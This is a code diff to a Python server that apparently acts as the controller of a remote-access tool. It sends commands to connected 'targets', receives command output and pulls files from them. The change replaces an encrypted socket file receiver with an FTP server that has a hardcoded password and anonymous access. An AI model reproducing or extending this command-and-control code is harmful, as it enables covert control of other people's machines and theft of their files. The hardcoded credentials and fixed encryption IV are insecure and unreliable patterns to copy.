@@ -5,8 +5,10 @@ from time import sleep
 import rsa
 import subprocess, os
 from datetime import datetime
-from Crypto.Cipher import AES
-from Crypto.Random import get_random_bytes
+from pyftpdlib.authorizers import DummyAuthorizer
+from pyftpdlib.handlers import FTPHandler
+from pyftpdlib.servers import FTPServer
+import logging
 
 SECONDS_RANGE = 5
 MAX_MESSAGES_PER_SECOND = 1   # 5 messages in SECONDS_RANGE seconds
@@ -58,10 +60,12 @@ def target_handler():
                 elif cmd.startswith("download "):
                     cmd = cmd[9:]           # cmd becomes the file name
                     header = "/foutput,"     # means the body is the name of the file to download
+                    global fname
+                    fname = cmd
 
                 cmd = header + cmd
                 try:
-                    send_message(cmd, target)   # client should connect to receiver socket
+                    send_message(cmd, target)   # client should connect to ftp server
                 except OSError:
                     cmd = "exit"
                 
@@ -203,38 +207,34 @@ def target_handler():
                         colored(f"\r {time}", "white", attrs=["dark"]) + colored(f" {nick.strip()}:", "white")
                     )
 
+
+
 def wait_for_files():
-    HOST = ''
-    PORT = 65530
+    logging.basicConfig(filename='pyftpdlib.log', level=logging.INFO)
+    try:
+        authorizer = DummyAuthorizer()
+        authorizer.add_user("user", "12345", "downloads/", perm="w")
+        authorizer.add_anonymous("downloads/")
 
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-        sock.bind((HOST, PORT))
-        sock.listen(1)
-        sock.settimeout(2)
+        handler = FTPHandler
+        handler.authorizer = authorizer
 
-        while not stop_server:
-            try:
-                conn, addr = sock.accept()
-            except (TimeoutError, socket.timeout):
-                continue
-            
-            Thread(target=receive_file, args=(conn,)).start()
+        server = FTPServer(("127.0.0.1", 21), handler)
+        
+    except OSError as e:
+        print(colored("\r-> Server must be run as root in order to open ftp connections\n$: "))
+        return
+
+    while not stop_server:
+        try:
+            server.serve_forever(timeout=2)        
+        except TimeoutError:
+            continue
+    return
 
 
-def receive_file(conn : socket.socket):
-    global RSA_KEY_LEN, private_key
-    # receive AES key
-    key = rsa.decrypt( conn.recv(int(RSA_KEY_LEN/8)), private_key )
-    BUF_SIZE = 66560
-
-    conn.settimeout(None)
-    
-    msg = conn.recv(BUF_SIZE)
-    fname = decrypt_message(key, msg).decode('utf-8', errors='ignore')
-
-    msg = conn.recv(BUF_SIZE)
-    fsize = decrypt_message(key, msg).decode('utf-8', errors='ignore')
-    fsize = int(fsize)
+def progress_bar():
+    global fname, fsize
 
     GB = 1024**3
     MB = 1024**2
@@ -251,48 +251,30 @@ def receive_file(conn : socket.socket):
         UNIT = "KB"
         unit = KB
 
-    bytes_received = 0
-    unit = 1
-    start = datetime.now()
-    f = open(f"downloads/{fname}", "wb")
+    while not os.path.exists("downloads/"+fname):
+        sleep(0.1)
+
+    print(f"{fname}:")
+    bytes_received = os.path.getsize("downloads/"+fname)
+
     while bytes_received < fsize:
-        packet = decrypt_message( key, conn.recv(BUF_SIZE) )
-        if not packet:
-            break
-
-        percentage = int( bytes_received/fsize * 100 )
-
-        bar = (f"\r{percentage}% |>") + colored("-" * int( percentage/2 ), "yellow") + (" " * (50 - int(percentage/2) )) + "<| " + str( int(bytes_received/unit) ) + f"{UNIT}/" + str(int(fsize/unit)) + f"{UNIT}"
+        percentage = int(bytes_received / fsize * 100)
+        bar = (f"\r{percentage}% |>") + colored("-" * int( percentage/2 ), "yellow") + (" " * (50 - int(percentage/2) )) + "<| " + ( "%.2f" %(bytes_received/unit) ) + f"{UNIT}/" + str(int(fsize/unit)) + f"{UNIT}"
         print(bar, end="")
-        f.write(packet)
-
-    f.close()
-    bar = (f"\r100% |>") + colored("-" * 100, "yellow") + "<|" + str(int(fsize/unit)) + f"{UNIT}/" + str(int(fsize/unit)) + f"{UNIT}"
-    print(bar, end="")
-
-    finish = datetime.now()
-    print(f"\n{finish-start}")
+        sleep(0.1)
+        bytes_received = os.path.getsize("downloads/"+fname)
     
+    bar = (f"\r100% |>") + colored("-" * 50, "green") + "<| " + str( int(fsize/unit) ) + f"{UNIT}/" + str(int(fsize/unit)) + f"{UNIT}"
+    print(bar + "\n$: ", end="")
+
     return
-
-def encrypt_message(key : bytes, message : bytes):
-    iv = get_random_bytes(AES.block_size)
-    cipher = AES.new(key, AES.MODE_CFB, iv)
-    ciphertext = cipher.encrypt(message)
-    return (iv + ciphertext)
-
-def decrypt_message(key : bytes, ciphertext : bytes):
-    iv = b"qwertykiolsksocd"
-    cipher = AES.new(key, AES.MODE_CFB, iv)
-    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
-    return plaintext
 
 # Send message to specified client
 def send_message(data, client):
     client["conn"].sendall( rsa.encrypt(data.encode(), client["key"]) )
 
 def handle_connection(client : dict, conn : socket.socket = None):
-    global private_key, RSA_KEY_LEN, stop_thread, stop_server, file_name
+    global private_key, RSA_KEY_LEN, stop_thread, stop_server, fname, fsize
 
     conn = client["conn"]
     addr = client["addr"]
@@ -340,13 +322,23 @@ def handle_connection(client : dict, conn : socket.socket = None):
                     continue
 
             if not data: continue
+            data = data.decode('utf-8', errors='ignore')
 
-            data = data.decode('utf-8', errors='ignore')  
             if data.startswith("/fname,"):
-                file_name = data[7:]
+                fname = data[7:]
                 continue
 
-            if data.startswith("/output,"):
+            elif data.startswith("/fsize,"):
+                try:
+                    fsize = int( data[7:] )
+                    bar_thread = Thread(target=progress_bar)
+                    bar_thread.start()
+
+                except ValueError as ve:
+                    fsize = -1
+                continue
+
+            elif data.startswith("/output,"):
                 print(data[8:], end="")
                 continue
 
@@ -421,10 +413,14 @@ def remove_client(client : dict):
 def exchange_keys(conn : socket.socket):
     global public_key, clients
 
-    conn.sendall( public_key.save_pkcs1() )
-    client_key = rsa.PublicKey.load_pkcs1( conn.recv(1024) )
+    try:
+        conn.sendall( public_key.save_pkcs1() )
+        client_key = rsa.PublicKey.load_pkcs1( conn.recv(1024) )
 
-    private_ip = rsa.decrypt(conn.recv(int(RSA_KEY_LEN/8)), private_key).decode('utf-8', errors='ignore')
+        private_ip = rsa.decrypt(conn.recv(int(RSA_KEY_LEN/8)), private_key).decode('utf-8', errors='ignore')
+    
+    except ConnectionResetError:
+        return False
     
     client = {
         "conn": conn,
@@ -437,6 +433,7 @@ def exchange_keys(conn : socket.socket):
     }
 
     clients.append(client)
+    return True
 
 
 def main():
@@ -461,9 +458,6 @@ def main():
     stop_thread = False
     stop_server = False
 
-    global file_name
-    file_name = "recv.txt"
-
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((HOST, PORT))
         print(colored("=> Server started", "green"))
@@ -481,7 +475,8 @@ def main():
 
                 conn.sendall( public_key.save_pkcs1() )
 
-                exchange_keys(conn)
+                if not exchange_keys(conn):
+                    continue
                 client = clients[-1]
 
                 if tuple((addr[0], client["private_addr"])) in banned_ips:
